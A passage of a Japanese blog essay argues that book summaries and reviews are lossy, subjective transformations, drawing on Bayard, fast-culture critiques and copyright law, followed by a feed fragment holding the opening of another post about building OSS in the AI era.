や要約は、後者だ。これは単なる比喩ではない。要約という行為は、情報を小さくしているのではなく、情報を別の何かに変えているのだ。そしてその過程で、何かが——多くの場合、最も大切な何かが——失われる。要約という名の変換要約のプロセスを観察してみるといい。そこには、本人も気づいていない、いくつもの「変換」が起きている。選択的フィルタリングという暴力要約者は、自分が「重要だ」と判断した部分を抽出する。しかしこの「重要性」は、極めて主観的だ。要約者の経験、専門性、価値観、そして何より要約者が今抱えている問題意識——これらすべてが、無意識のフィルターとして機能する。マーケティング担当者が読む技術書と、エンジニアが読む同じ技術書では、心に残る章が違う。当然だ。でもこれは、どちらかが間違っているという話ではない。同じ本から、異なる意味が立ち上がっているだけだ。そしてその意味の違いは、読者ではなく、読み方によって生まれる。要約という行為は、この「読み方」を一つに固定する。要約者の読み方が、唯一の読み方として提示される。そして要約を読む私たちは、その固定された読み方を、本の内容そのものだと錯覚する。文脈の切断という喪失著者は意図的に章を配置する。第一章から第十章へと、徐々に論理を積み上げていく。前の章の具体例が、後の章の理論の基礎になる。ある議論は、数章前の別の議論を前提としている。この「流れ」は、本の核心的な要素の一つだ。理解とは情報の構造化だからだ。著者が用意した順序で読むことで、私たちの頭の中に、新しい思考の枠組みが少しずつ形成されていく。でも要約は、この流れを切断する。第三章の結論、第七章の重要なポイント、第十章のまとめ——それらは箇条書きになって並べられ、互いの繋がりは失われる。結論だけが残り、そこに至るまでの思考の階段は消える。そして多くの場合、その階段こそが、最も価値のある学びだったのだ。言語の置き換えという変質著者が選んだ言葉には、意味がある。その比喩、その言い回し、その微妙なニュアンス——それらはすべて、著者が伝えたい何かを形にするために、慎重に選ばれている。しかし要約者は、それを自分の言葉に置き換える。分かりやすく、簡潔に、読みやすく。善意からの行為だ。しかしこの過程で、著者の「声」は失われる。翻訳と同じだ。どれだけ優れた翻訳でも、原文の響きは失われる。要約も同じ。どれだけ丁寧な要約でも、著者が選んだ言葉の持つ微妙な意味の重なりは、消えてしまう。そして私たちは、その消失に気づかない。思考プロセスの消失という致命的な欠落最も大きな喪失は、これだ。著者が試行錯誤の末に辿り着いた結論。一度は正しいと思ったが、後に間違いだと気づいた考え。検討したが採用しなかった別のアプローチ。考えを変えた転機となった出来事。こうした思考の軌跡は、要約では「結論」だけが残る。「著者はこう主張している」と。でも、なぜその主張に至ったのか、どんな葛藤があったのか、何を捨てて何を選んだのか——そのすべてが消える。けれど、学びとは結論を知ることではなく、その結論に至るプロセスを追体験することだ。著者の思考の軌跡を辿ることで、私たちの思考の枠組みが変わる。結論だけを知っても、それは情報の追加にすぎず、思考の変容は起きない。要約は、この核心を、最初に捨てる。同じ本、異なる要約の謎興味深い実験をしてみるといい。同じ一冊の本について、複数の要約を読んでみるといい。驚くほど違う内容が書かれている。ある経営書を読んだ場合を想像してみよう。スタートアップの創業者は、リスクテイクと革新の章を強調するかもしれない。彼らにとって重要なのは「いかに新しいことを試すか」だから。大企業の管理職は、組織マネジメントと持続可能性の部分に注目するだろう。彼らが直面しているのは、既存の組織をいかに動かすかという問題だから。学者は、理論的フレームワークと研究手法に焦点を当てる。彼らが関心を持つのは、この本がどんな学術的文脈に位置するかだから。それぞれの要約は「正しい」。でもそれは、元の本ではない。要約者のレンズを通して屈折した像だ。そして恐ろしいことに、私たちはその屈折を、見ることができない。なぜか。要約には、要約者の視点が明示されないからだ。「私はスタートアップ創業者として、この本からリスクテイクの部分に注目した」とは書かれない。ただ「この本の重要なポイントは」と書かれる。まるで客観的な事実であるかのように。しかし客観的な要約など、存在しない。すべての要約は、誰かの主観を通した変換だ。その主観は、透明なレンズのように見えて、実は色付きのフィルターなのだ。「読んだ」と「読んでいない」という曖昧な境界私たちは「本を読んだ」という言葉を単純に使いすぎている。ピエール・バイヤールの『読んでいない本について堂々と語る方法』では、読書という行為を興味深く分類している。バイヤールは読書を次のように区分けする。UB（unread book） ——まったく読んでいない本SB（skimmed book） ——ざっと目を通した本HB（heard about book） ——人から聞いた本、あるいは書評で知った本FB（forgotten book） ——読んだが内容を忘れた本この分類を見て、私たちは気づく。「読んだ」と「読んでいない」という二項対立は、実は単純なものではないのだと。最後のページまで目を通したが内容をほとんど覚えていない本と、要約だけ読んだが著者の主張をよく理解している本——どちらが「読んだ」と言えるのか。人から聞いた話を通じてその本の核心的なアイデアに触れた場合と、本は買ったが積読のまま放置している場合——どちらが「読んでいない」と言えるのか。答えは簡単ではない。というより、この問い自体が間違っているのかもしれない。問われるのは「読んだか読んでいないか」という形式的な区分けではなく、その本とどのような関係を結んでいるか、その本を通じてどのような思考を展開できるか——そういった実質的な次元なのだ。読んでいない本について語る「状況」バイヤールは、読んでいない本について語ることの不可避性を指摘する。私たちは日常的に、読んでいない本について語らざるを得ない状況に置かれている。会議で誰かが本を引用する。読んだことはないが、その場で意見を求められる。友人が「あの本、どう思う？」と訊いてくる。正直に「読んでない」と言えば会話は終わるが、書評で得た知識をもとに語れば、豊かな対話が生まれる。就職面接で「最近読んだ本は？」と訊かれる。最後まで読了した本だけを答えの対象にすれば、選択肢は著しく狭まる。これらの状況を具体的に検討してみると、面白いことが見えてくる。本について語ることは、必ずしも本を最後まで読了していることを前提としていない。むしろ、本の周辺にある言説——書評、要約、他者の解釈、断片的な引用——これらを媒介にして語ることが、実は創造的な思考を生み出すことがある。友人が薦めた本について、その友人の語り口から想像を膨らませて議論する。その過程で、原著にはない新しい視点が生まれることがある。書評を読んで著者の意図を「誤読」し、その誤読から独自の考察を展開する。その考察が、時として原著を超える洞察に至ることもある。つまり、本について語ることは、必ずしも本を「正確に」理解することを目的としていない。本を触媒として、自分の思考を展開すること——それが本質なのだ。要約という考察の可能性ここで視点を変えてみよう。要約や書評を、単なる「劣化コピー」ではなく、一種の「考察」として捉え直すとどうなるか。要約者は、本を読んで何かを感じ取る。その「何か」を言語化しようとする。この過程は、実は高度に創造的な行為だ。無数の情報の中から何を選び、どう配置し、どう言葉にするか——この選択と構成の過程で、要約者独自の思考が立ち上がる。だから、優れた書評や要約は、原著とは別の価値を持つ。それは原著の「圧縮版」ではなく、原著から触発された、要約者の「考察」なのだ。私自身、年間でかなりの書評を作っている。しかし公開しているのはごくごく一部だ。なぜか。私はあまり有能な方ではないから、書籍を漫然と読んでも深い学びを得ることができない。だから書評を書く。書評を書くという行為を通じて、自分が何を理解し、何を理解していないのかを明確にする。どこに引っかかったのか、どこが腑に落ちたのか——それを言語化することで、初めて本当の理解が生まれる。公開しているものは、作った書評の中で「公開して良いかな」と思った文章を加筆修正したものだ。つまり、書評を書く行為そのものは、公開のためではなく、自分の理解を深めるためのものなのだ。たとえば、ある技術書について複数のエンジニアが書評を書いたとする。一人は実装の観点から、一人は設計思想の観点から、一人は歴史的文脈の観点から語る。これらの書評を読むことで、私たちは原著が持つ多面性に触れることができる。そしてそれぞれの書評が、原著を読むための異なる「補助線」になる。この意味で、要約や書評は原著を補完し、豊かにする。原著だけを読むよりも、原著と複数の書評を読む方が、理解が深まることがある。なぜなら、一冊の本が持つ可能性を、複数の視点から照らし出すことができるからだ。ファスト教養という時代の文脈ただし、ここで注意すべき点がある。要約や書評が「考察」として価値を持つのは、それが原著への入り口として機能するか、あるいは原著と対話する形で展開される場合だ。現代には「ファスト教養」とでも呼ぶべき現象がある。短時間で「教養」を身につけたように見せるための、効率化された知識の消費。要約を読んで「読んだ」と言い、書評を見て「理解した」と思い込む。そこには、本との本当の対話はない。ファスト教養の問題は、効率性そのものではない。問題は、本と自分の間に常に誰か（要約者、解説者、インフルエンサー）が介在し、自分で考える機会が失われることだ。バイヤールが指摘するように、読んでいない本について語ることは、自分で思考し言語化する状況では創造的な行為になり得る。しかしそれは、自分の頭で考え、自分の言葉で語る場合に限る。誰かの要約をコピー&ペーストして語るのは、創造ではなく模倣だ。変換を活用する五つの方法では、要約や書評という「変換」を、どう活用すべきなのか。1. 要約者の視点を意識する要約を読むとき、「これは誰の視点か」を常に問う。その人の専門性、立場、問題意識——それらを意識することで、フィルターの存在が見えてくる。そして「では自分なら、どこに注目するか」と考える。2. 複数の解釈を並置する一つの要約だけを読むのではなく、複数の異なる視点からの解釈を集める。それらを比較することで、本が持つ多面性が見えてくる。そして何より、「絶対的な正解」など存在しないことが分かる。3. 要約を「問い」として読む要約を「答え」として受け取るのではなく、「問い」として読む。「この要約者はなぜこの部分を重要だと判断したのか」「省略された部分には何があったのか」——そう問うことで、要約は思考の出発点になる。4. 自分なりの考察を加える要約を読んで、自分なりの考察を加えてみる。「自分の経験ではどうか」「別の文脈ではどうなるか」「反対の立場から見たらどうか」——そうやって思考を展開することで、要約は単なる情報から、思考の触媒へと変わる。5. 原典への道標として使うそして何より、要約を原典への道標として使うことだ。要約で興味を持ったら原典を読む。要約で疑問を持ったら原典で確認する。要約と原典の間を行き来することで、理解は深まる。読んでいない本について語る際の倫理バイヤールは、読んでいない本について語る際に注意すべき点を挙げている。第一に、読んでいないことを隠す必要はない。「詳しくは読んでいないが」「書評で読んだ限りでは」——そう前置きすることで、誠実さを保ちながら対話を続けられる。第二に、自分の解釈を絶対化しない。「私はこう理解した」「私にはこう見える」——主語を「私」にすることで、それが一つの視点に過ぎないことを示す。第三に、他者の解釈を尊重する。要約や書評は、誰かの真剣な思考の結果だ。それを軽んじることなく、一つの有効な視点として受け止める。そして第四に、思考を停止させないことだ。要約を読んで「分かった」で終わらせず、そこから自分なりの思考を展開する。これらの点を意識すれば、読んでいない本について語ることは、単なる知ったかぶりではなく、創造的な知的活動になり得る。要約や書評を通じて、新しい視点を獲得し、自分の思考を深め、時には原著を超える洞察に至ることさえ可能なのだ。書評・要約と著作権——変換者の責任変換の価値を語るとき、避けて通れない現実がある。それは法律だ。私たちが要約や書評を「考察」として価値あるものにできるのは、それが著作者の権利を侵害しない範囲で行われる場合に限る。自分の良し悪しだけで判断できる問題ではない。著作権法では、著作物を「翻案」する権利は著作権者に帰属する。要約はこの「翻案」に該当する可能性がある。一方で、「引用」は一定の条件を満たせば許諾なく行える。興味深いのは判例だ。「血液型と性格」事件（東京地判平成10年）では、やむを得ない範囲での要約引用は著作権侵害にならないと判断された。全文をそのまま引用するより、要約する方が著作権者の利益を損なわない場合があるという理由だ。ここに、変換という行為の本質が見える。情報そのものには著作権はないが、表現には著作権がある。著者の文章表現をそのまま使うのは問題になり得る。しかし、その情報を自分の言葉で表現し直すのであれば——つまり、本当の意味で「変換」するのであれば——著作権侵害には該当しにくい。これは単なる法的な制約ではない。むしろ、変換者としての私たちに課された創造的な責任だ。他人の言葉をコピーするのではなく、自分の言葉で語り直す。その過程で、私たちは否応なく考えることを強いられる。要約や書評は、著作者と読者をつなぐ架け橋になり得る。しかしそれは、著作者の権利を尊重し、自分の言葉で語るという責任を引き受けた上でのことだ。変換の二面性要約や書評という「変換」は、原著者の思想と要約者の解釈が混ざり合ったハイブリッドだ。そしてその混ざり具合は、多くの場合見えない。ここには確かに危険性がある。要約を原著そのものだと錯覚し、要約者の解釈を著者の思想だと思い込む。そして気づかないうちに、自分で考える機会を失う。著者の思想と対峙し、自分の経験と照らし合わせ、時には反論し、格闘する——その過程が省略される。でも同時に、ここには可能性もある。要約や書評は、原著にはない新しい視点を提供してくれることがある。著者自身も気づいていなかった含意を、要約者が読み取ることがある。異なる文脈に置き直すことで、原著が持つ新しい意味が立ち上がることがある。つまり、変換は単なる劣化ではなく、一種の創造なのだ。原著というテキストに、要約者という読者が介入することで、新しい意味が生成される。そしてその新しい意味は、原著を豊かにすることもあれば、原著を歪めることもある。問題は変換そのものではなく、私たちがその変換を意識しているかどうかだ。変換を透明なものとして扱えば、それは欺瞞になる。でも変換を変換として認識し、その特性を理解した上で活用すれば、それは強力な思考のツールになる。現代という時代の加速装置そして現代という時代が、この問題を加速させている。インスタント化という麻薬スマホを開けば、10分で読める要約が溢れている。YouTubeには、本の内容を解説する動画が無数にある。ChatGPTに聞けば、数秒で本の要約を生成してくれる。便利だ。効率的だ。時間を節約できる。しかし私たちは、その便利さの代償を理解しているだろうか。私たちの脳は、インスタントな刺激に適応してしまっている。10分で読める要約、数秒で生成されるAIの解説、流し読みで済む箇条書き——これらに慣れた脳は、長い文章を追うこと、モヤモヤを抱えること、結論が出ないまま考え続けることに、耐えられなくなっている。スマホを見すぎて長い文章が頭に入らないエンジニアは多い。メンターしている若者も「技術書を読むのがしんどい」と言っていた。しかし一週間デジタルデトックスをしたところ、普通に読めるようになった。これは脳が「即時反応モード」から「深く考えるモード」に戻ったからだ。本を読むことは、時間がかかる。最初は分からない。モヤモヤする。何度も読み返す。考える。また読む。この不快で面倒なプロセスを経て、ようやく理解が生まれる。しかしインスタントな要約は、このプロセスをスキップさせる。分からないまま待つ必要がなく、モヤモヤを抱える必要もなく、すぐに「分かった」という感覚が得られる。この即座の満足は、甘い。甘すぎる。そして一度この甘さを知ってしまうと、本を読むという苦行には戻れなくなる。AI要約という危機AIの発展により、要約はさらに加速する。数秒で本を要約し、重要なポイントを箇条書きにし、分かりやすく説明してくれる。思考とは、情報を「受け取る」ことではなく、情報と「格闘する」ことだ。著者の主張に疑問を持ち、自分の経験と照らし合わせ、別の解釈の可能性を探る——この格闘が、思考を育てる。しかしAI要約やファスト教養は、この格闘を省略する。すぐに「分かった」という感覚を提供し、考える時間を奪う。私たちは、知識は増えているが、思考は深まらない——そんな状態に陥る。孤独の喪失という静かな危機もう一つ、見落とされがちな喪失がある。それは、本と一対一で向き合う時間だ。スマホがなかった時代、本を読むとは孤独な行為だった。自分と本だけ。他の誰も介在しない。理解できなくても、退屈でも、そこに居続けるしかなかった。しかし今は違う。少し難しい箇所に来れば、すぐにスマホに手が伸びる。「この部分、要約ないかな」と検索する。あるいは「ちょっと休憩」と言って、SNSを開く。私たちは、孤独に耐えられなくなっている。モヤモヤを抱えたまま、一人で考え続けることができなくなっている。でも本を読むという行為の本質は、この孤独にある。自分の頭で考え、自分の言葉で理解しようとする。誰も助けてくれない、その孤立した状態で、著者の思想と格闘する。この孤独な格闘を経てこそ、本当の意味での理解が生まれる。でも要約は、この孤独を奪う。常に誰かが横にいて、「正解はこれだよ」と教えてくれる。その優しさが、私たちから考える力を奪っていく。本を読むということの本質では、本を読むとは、本当は何をすることなのか。それは、自分を変えることだ。長い時間をかけて、ゆっくりと、確実に。理解とは変容である本を読んで「理解した」というとき、私たちは何を指しているのか。情報を獲得したこと？　結論を知ったこと？違う。理解とは、自分の思考の枠組みが変わることだ。本を読む前と読んだ後で、同じ現象を見ても、違うものが見えるようになる。同じ問題に直面しても、違う解決策が浮かぶようになる。同じ言葉を聞いても、違う意味が響くようになる。これが理解だ。情報の追加ではなく、認識の変容。そしてこの変容は、時間をかけて、ゆっくりと起きる。著者の思考を辿る。分からない箇所で立ち止まる。自分の経験と照らし合わせる。疑問を持つ。また読む。少しずつ、著者の視点が自分の中に入ってくる。そして気づけば、自分の見ている世界が、少し変わっている。この変容は、要約では起きない。なぜなら要約には、この「時間」が含まれていないからだ。結論だけを知っても、それは自分の外側にある情報のままだ。内側に入ってこない。格闘としての読書本を読むとは、著者と格闘することだ。著者の主張を理解しようとする。でも納得できない部分がある。「本当にそうだろうか」と疑問を持つ。自分の経験では違うと感じる。でも著者はこう言っている。なぜだろう。何が違うのか。この格闘の過程で、私たちは考える。自分の前提を疑い、著者の前提を探り、両者の違いを見つけようとする。そして時には、自分が間違っていたことに気づく。あるいは、著者の限界を見抜く。どちらにせよ、この格闘を経て、私たちの思考は深まる。でも要約は、この格闘を省略する。著者の主張は、すでに要約者によって消化されている。疑問を持つ余地もなく、「重要なポイントはこれです」と提示される。私たちは、受け取るだけだ。格闘がなければ、成長もない。反復という学び本は、一度読んで終わりではない。本当に価値のある本は、何度も読み返す価値がある。なぜか。同じ本でも、読むたびに違うものが見えるからだ。一年前に読んだとき、心に響いた章がある。でも今読み返すと、別の章が響く。当時は流し読みした箇所が、今は重要に思える。著者の何気ない一言が、今の自分の状況と重なって、深い意味を持って迫ってくる。これは、私たちが変わったからだ。経験を積み、視点が変わり、問題意識が変わった。同じ本を読んでも、違う自分が読んでいる。だから、違うものが見える。この反復的な読書によって、本は私たちの中で育っていく。最初は30%の理解だったものが、二度目で50%になり、三度目で70%になる。そして何度目かの読書で、「ああ、著者はこのことを言いたかったのか」と、ようやく本当の理解に到達する。でも要約は、この反復を許さない。一度読めば終わりだ。すべてが書かれている。何度読んでも、同じことしか書いていない。要約は、本の成長を止める。そして私たちの成長も、止める。余白という豊かさ本には、余白がある。著者が明示的に書いていないこと、行間に隠れた意味、読者に委ねられた解釈の余地——これらの余白が、本を豊かにする。余白があるから、私たちは考える。「著者はここで何を言おうとしているのか」「この比喩は何を意味するのか」「なぜこの順序で書いたのか」。そして余白があるから、読者ごとに違う解釈が生まれる。同じ本を読んでも、ある人はビジネスのヒントを得て、ある人は人生の指針を見出し、ある人は哲学的な洞察を得る。この多様性こそが、本の価値だ。一つの正解があるのではなく、無数の読み方が可能である——その豊かさが、本を読む喜びを生む。でも要約は、この余白を埋める。すべてを明示し、すべてを説明し、一つの解釈に固定する。「この本の意味はこれです」と。余白が消えたとき、本は死ぬ。そして読む喜びも、死ぬ。要約の正しい役割要約は、門だ。家ではない。本を読むかどうか判断するために、要約を読む。これは合理的だ。すべての本を精読する時間は、誰にもない。要約を読んで、「この本は自分に必要そうだ」「この本は今の自分には合わないかもしれない」と判断する。この使い方なら、要約は有用なツールだ。あるいは、すでに読んだ本の要約を読む。記憶を呼び覚ますトリガーとして。「ああ、そうだった」と思い出すために。これも正しい使い方だ。問題は、要約を読んで「本を読んだ」と思うことだ。門をくぐって「家に入った」と思うことだ。要約は入口であって、目的地ではない。複数の要約を読むという戦略一つの本について、複数の要約を読んでみる。すると、面白いことが見えてくる。要約ごとに、強調されている部分が違う。ある要約が重要だと言っている章を、別の要約は触れてもいない。ある要約の解釈と、別の要約の解釈が、矛盾している。この違いこそが、要約の本質を暴く。要約は客観的な事実ではなく、誰かの主観的な解釈だということが、複数の要約を比較することで見えてくる。そして同時に、本の多面性も見えてくる。一つの本が、いかに豊かで、いかに多様な読み方を許容しているか——それを複数の要約から、間接的に感じ取ることができる。ただし、この戦略も、本を読む代わりにはならない。あくまで、本を読む前の準備、あるいは読んだ後の確認として機能する。要約者のバックグラウンドを知るという習慣「誰が要約しているのか」に注目する習慣を持つといい。その人の専門性は何か。どんな立場で、どんな問題意識を持っているか。どんなバイアスを持っている可能性があるか。これを意識するだけで、要約の読み方が変わる。「ああ、この人はマーケティングの専門家だから、この部分を強調しているのか」「この人はエンジニアだから、技術的な側面に注目しているのか」。要約者のフィルターが見えてくる。そのフィルターを通して、何が強調され、何が省略されているのかが、推測できるようになる。そして何より、「では自分が読んだら、どこに注目するだろうか」と考えることだ。要約者と自分の違いを意識することで、自分のフィルターも見えてくる。自分で要約してみるという修行最も効果的な学びは、自分で要約を書いてみることだ。本を読んで、自分なりの要約を書く。すると、いかに難しいかが分かる。何を残して何を捨てるか、その判断の難しさ。著者の言葉を自分の言葉に置き換える際の、意味のズレ。思考のプロセスを、結論だけに圧縮することの暴力性。この体験を経ると、要約の限界が肌で分かる。そして要約を読むときの姿勢が、変わる。「これは要約者の解釈である」「著者の本当の意図は、もっと複雑かもしれない」「失われた部分があるはずだ」——そう意識しながら読むようになる。自分で要約を書くことは、要約に対する批判的読解力を育てる。読書リテラシーという現代の必須能力情報が溢れる時代だからこそ、必要なのは情報の「形式」を理解するメタ認知だ。速読という幻想を捨てる「速く読む」ことを目標にするのは、間違っている。大切なのは、速さではなく、深さだ。一冊の本を一時間で読むことより、一冊の本と一ヶ月向き合うことの方が、はるかに価値がある。もちろん、すべての本をそう読む必要はない。流し読みでいい本もあるし、要約で十分な本もある。でも少なくとも、年に数冊は、時間をかけて、深く読む本があっていい。その数冊が、あなたを変える。要約を百冊読むより、原典を三冊、じっくり読む方が、思考は深まる。速読を目指すのではなく、深読を目指す。これが、現代の読書リテラシーだ。不完全な理解を受け入れる勇気本を読んでも、すべては理解できない。これは当たり前のことだ。著者が何年もかけて考えてきたことを、数時間や数日ですべて理解できるはずがない。分からない部分があって当然だし、誤読することもある。しかし私たちは、この不完全さを受け入れられない。すぐに「分かった」という感覚を求めて、要約に逃げる。肝心なのは、不完全な理解を抱えたまま、読み続けることだ。分からない部分を、分からないまま保留しておく。「いつか分かるかもしれない」と思いながら、先に進む。この「分からなさ」を抱える力が、深い理解への鍵だ。すぐに「分かった」と結論づけず、モヤモヤを抱え続ける。そして時間をかけて、徐々に理解が深まっていく。要約は、この不完全さを許さない。すべてを明快に説明し、すべてを分かりやすくする。でもその分かりやすさは、理解の深さを犠牲にしている。不完全さを受け入れる勇気を持つこと。これが、本を読むということの本質だ。変容には時間がかかる最後に、最も重要なことを言いたい。本を読むことは、自分を変えることだ。そして変容には、時間がかかる。本を読んで即座に変わる、ということは、ほとんど起きない。自己啓発書を読んで「明日から変わろう」と思っても、明日になれば何も変わっていない。でもそれは、本が悪いのではなく、私たちの期待が間違っているのだ。本による変容は、もっとゆっくりと起きる。読んだ内容は、すぐには自分のものにならない。でも心のどこかに引っかかる。数週間後にふと思い出し、数ヶ月後に似た状況で無意識に浮かんでくる。そして気づけば、半年前の自分とは少し違う判断をしている。この反芻の過程で、本の内容は私たちの中に染み込んでいく。最初は外側にあった考え方が、徐々に内側に入ってくる。要約は、この反芻を許さない。分かりやすく整理されすぎていて、心に引っかからないからだ。百冊の本という選択では、どんな本を読むべきなのか。すべての本を深く読む時間は、誰にもない。だからこそ、選択が必要になる。ある人は言った。「私の人生を変えた一冊がある」と。その本を、彼は何度も読み返している。二十代で初めて読み、三十代で読み返し、四十代でまた読む。そして読むたびに、違うものが見える。これが、本との本当の付き合い方だ。一度読んで終わりではなく、人生を通じて対話し続ける。そしてこの長い対話を通じて、本は私たちの一部になる。著者の思想が、自分の思想と混ざり合い、区別がつかなくなる。「これは本で読んだ考えか、自分で考えたことか」分からなくなる。でもそれでいい。それこそが、本を読むことの到達点だ。ただし、一冊の本をそこまで深く読むのは難しい。だから私は思う。本は、百冊あればいい。これは、大量の本の中から自分にとっての正典となる百冊を、自分の力で選ぶということだ。世間で話題の本、ベストセラー、有名人が推薦する本——それらを漫然と読むのではなく、自分にとって本当に大切な百冊を見極める。本棚に深みがあり見栄えの良い本を並べておけば、すぐに読めなくても次第に自分が本に似合う人間になれる。これは不思議な現象だが、本当だ。手元に置いた本は、読まなくても、その存在だけで私たちに影響を与える。「いつか読もう」と思いながら本棚にある本は、私たちに問いかけ続ける。「お前はまだ、私を読む準備ができていないのか」と。読む本を選ぶときには、二つの軸が必要だ。一つは、自分がはまっている関心事を深堀りするように選ぶ。自分の興味、自分の問題意識、自分が今向き合っている課題——それらに関連する本を追いかける。これは内側からの選択だ。もう一つは、定評のある必読リストに沿って選び、外からの影響で自分を変えること。古典と呼ばれる本、専門家が推薦する本、時代を超えて読み継がれている本——自分の興味の外側にある本を、意識的に選ぶ。これは外側からの選択だ。この二つのバランスが、百冊を豊かにする。自分の関心だけで選べば視野が狭くなり、他人の推薦だけで選べば自分を見失う。両方を組み合わせることで、百冊は自分を映す鏡であると同時に、自分を超える窓になる。おわりに書評や要約は、可逆圧縮ではなく非可逆変換だ。それは欠陥ではなく、本質だ。変換を透明なものとして扱えば欺瞞になる。変換として認識し、活用すれば強力なツールになる。要約を入り口として本を探索し、気になったものは原典に当たる。自分にとっての百冊を見極め、その百冊は時間をかけて深く読み、人生を通じて対話し続ける。これは効率性の問題ではない。どう思考するか、どう生きるかという、知的態度の問題だ。溢れる情報の海で溺れないために必要なのは、泳ぐ速度ではない。情報の形式を見抜く目と、それを使いこなす知恵だ。そして何より、自分で考える時間を守ること。誰かの変換を受け取るだけでなく、自分自身が変換者になること。本と格闘し、自分の言葉で語り直し、その過程で少しずつ変わっていくこと。私は今日も、まだ読み終えていない本を開く。昨日とは少し違う自分が、違うページを読んでいる。参考書籍百冊で耕す〈自由に、なる〉ための読書術作者:近藤 康太郎ＣＥメディアハウスAmazon庭の話作者:宇野 常寛講談社Amazon書評の仕事 (ワニブックスPLUS新書)作者:印南 敦史ワニブックスAmazonニッポンの書評 (光文社新書)作者:豊崎 由美光文社Amazonビブリオバトル　本を知り人を知る書評ゲーム作者:谷口忠大文藝春秋Amazon世界は知財でできている (講談社現代新書)作者:稲穂健市講談社Amazon読んでいない本について堂々と語る方法 (ちくま学芸文庫)作者:ピエール・バイヤール,大浦康介筑摩書房Amazon勉強の哲学　来たるべきバカのために　増補版 (文春文庫)作者:千葉 雅也文藝春秋Amazonセンスの哲学作者:千葉 雅也文藝春秋Amazon武器になる哲学 人生を生き抜くための哲学・思想のキーコンセプト50 (角川文庫)作者:山口 周KADOKAWAAmazon自分とか、ないから。　教養としての東洋哲学作者:しんめいPサンクチュアリ出版Amazonファスト教養　10分で答えが欲しい人たち (集英社新書)作者:レジー集英社Amazon映画を早送りで観る人たち～ファスト映画・ネタバレ――コンテンツ消費の現在形～ (光文社新書)作者:稲田 豊史光文社Amazon","isoDate":"2025-12-23T02:16:51.000Z","dateMiliSeconds":1766456211000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"The “No-Headache” Guide to Provisioning GPUs with Brev","link":"https://daisuke1024akagawa.medium.com/the-no-headache-guide-to-provisioning-gpus-with-brev-ac133834f7f4?source=rss-c54ac439ad2b------2","isoDate":"2025-12-22T10:32:04.000Z","dateMiliSeconds":1766399524000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"なぜ「何でも作れる時代」に私は作れないのか","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/22/135517","contentSnippet":"はじめに年末、2025年を振り返る。フォロワーは7倍になった。副業も順調。書籍の執筆や翻訳にも関わった。登壇の依頼も増えた。どこからどう見ても、良い年だったはずだ。なのに、胸の奥に澱のようなものが溜まっている。コードは書いた。山ほど書いた。でもそれは、誰かに頼まれたコードだ。お金になるコード。評価されるコード。「これを作ってください」と言われて、「はい」と答えて、作ったコード。自分のためのOSSも、作った。公開もした。そこそこ使われもした。でも、そこそこ止まりだ。「これが俺の代表作です」と言えるものが、ない。スターはついた。ダウンロードもされた。いくつかは今でも自分で使っている。完走した。自分なりに頑張った。でも、「代表作」と呼べるインパクトには届かなかった。厄介なことに、nwiizoというアカウントは大きくなってしまった。フォロワーが増えた分、「代表作」のハードルも上がっている。昔なら「動くものを公開した」で満足できた。今は違う。期待値が上がった分、自分で自分の首を絞めている。でも、諦めたくない。代表作を持つソフトウェアエンジニアに憧れて、この道に入った。あの人みたいになりたい、と思った先輩たちがいる。彼らのようにはなれていない。でも、まだ諦めたくない。新しいプロジェクトを始めようとするたび、手が止まる。「既存のツールで十分じゃないか」「誰が使うんだ、これ」。もっともらしい問いを自分に投げかけて、そのまま手を下ろす。完走したプロジェクトはある。でも、次の一歩が踏み出せない。検証のふりをした、逃避だ。「作らなくていい理由」を探して、見つけて、安心している。AIは「どう作るか」を教えてくれる。でも「何を作るか」は教えてくれない。技術力はもうボトルネックじゃない。足りないのは、決断だ。覚悟だ。「これを作る」と宣言して、不確実性の中に飛び込む蛮勇だ。私は「隙間家具屋」を自称してきた。大きな家具は作らない。洗濯機と壁の間の収納。冷蔵庫の上のラック。誰も気にしないけれど、あると少し楽になる小さなもの。それを作るのが好きだった。はずだった。2025年、隙間を見つける目は曇っていなかった。手も動いた。完走もした。でも、「これだ」という手応えが残らなかった。副業は収入になる。登壇は評価される。ブログはフォロワーが増える。全部、目に見えるリターンがある。OSSは違う。作っても誰にも使われないかもしれない。時間を注いでも、何も返ってこないかもしれない。その「かもしれない」に怯えて、私は確実なほうへ流れやすかった。OSSは作った。完走もした。でも、賭け金を上げられなかった。時間を注ぎ込むより、確実なリターンがある副業や登壇に逃げた。結果、そこそこ止まり。「これだ」と言えるものは掴めなかった。問題は、才能がないことだけじゃない。問題は、狂えなかったことだ。どこにも振り切れなかった。副業も、登壇も、OSSも、全部やりたかった。全部にいい顔をして、どれにも本気を出せなかった。半端な賭け金には、半端なリターンしか返ってこない。当たり前のことだ。このブログでは、「狂って量をやって、そこから引き算する」ための思考法を書く。 speakerdeck.com結論を先に言う。まず狂え。量をやれ。そして、量が満ちたら、容赦なく削れ。ポジティブケイパビリティとネガティブケイパビリティ「ネガティブ・ケイパビリティ」という概念がある。不確実さ、不思議さ、疑いの中に、結論を急がずに留まる能力のことだ。これに対して、「ポジティブ・ケイパビリティ」というのもある。問題を分析し、解決策を導き、実行する能力だ。ゴールが明確なときに発揮される力。私はおそらくだがこれが得意だ。生成AIは、ポジティブケイパビリティを劇的に強化した。「このAPIを叩いて、結果をパースして、DBに保存するコードを書いて」と指示すれば、動くコードが出てくる。「このエラーメッセージの原因を調べて」と頼めば、調査結果が返ってくる。ゴールが明確なタスクは、AIとの協働で驚くほど速く片付く。私の2025年は、まさにこれだった。仕事のコードは書けた。クライアントから「これを作ってほしい」と言われれば、作れた。締め切りがあり、要件があり、ゴールが明確なタスクは、以前より速く終わるようになった。しかし、ネガティブケイパビリティは強化されなかった。むしろ、弱体化した気もする。 以前なら、分からないまま3日間コードを書き続けることができた。今は、30分詰まるとAIに聞いてしまう。「分からない」という状態に耐える筋力が、確実に落ちている。OSS開発には、ネガティブケイパビリティが必要だ。「何を作るか」は誰も教えてくれない。「これが正解」という保証はない。作っている途中で「これは違うかも」と思うことがある。それでも手を動かし続ける。完成するかどうか分からない。使われるかどうか分からない。その不確実さの中に留まり続ける力。生成AIに「何を作るべきか」と聞いても、答えは出ない。AIは優秀なアシスタントだが、ゴールを設定するのは人間の仕事だ。ゴールが明確な仕事が速く片付くようになった結果、私の中で奇妙なことが起きた。「答えがすぐに出る」ことに慣れてしまった。 